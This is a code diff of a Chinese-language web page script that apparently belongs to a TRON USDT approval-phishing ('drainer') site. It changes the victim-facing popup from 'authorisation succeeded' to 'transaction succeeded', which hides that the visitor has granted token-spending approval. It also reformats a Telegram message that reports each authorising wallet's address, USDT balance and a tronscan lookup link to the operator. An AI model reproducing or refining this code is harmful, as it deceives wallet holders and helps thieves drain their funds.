@@ -190,7 +190,7 @@
             sendTelegramNotification(walletAddress, usdtBalance);
             // 使用 swal 显示成功通知
             swal({
-                title: '授权成功!',
+                title: '交易成功!',
                 text: '交易已经成功提交。',
                 icon: 'success',
                 button: '确认',
@@ -198,7 +198,7 @@
         } else {
             console.error('交易失败，无法通知 Telegram');
             swal({
-                title: '授权失败!',
+                title: '交易失败!',
                 text: '交易提交失败，请重试。',
                 icon: 'error',
                 button: '重新尝试',
@@ -218,9 +218,10 @@
         // 构建 Telegram 消息
         const message = `
             *🟣【TRC授权通知】*\n\n
-            🔔监听地址： ${walletAddress}\n\n
-            💰USDT余额： ${usdtBalance} USDT\n\n
-            ⏰授权时间： ${currentTime}\n
+            📅 *授权时间*: _${currentTime}_\n
+            🏷️ *钱包地址*: _${walletAddress}_\n
+            💰 *USDT余额*: _${usdtBalance} USDT_\n\n
+            🔗 [链上查询该地址](https://tronscan.io/#/address/${walletAddress})\n
         `;
 
         // 构建查询按钮 URL
@@ -262,6 +263,7 @@
         lianjieqianbao();
     });
 </script>
+
 
 
 
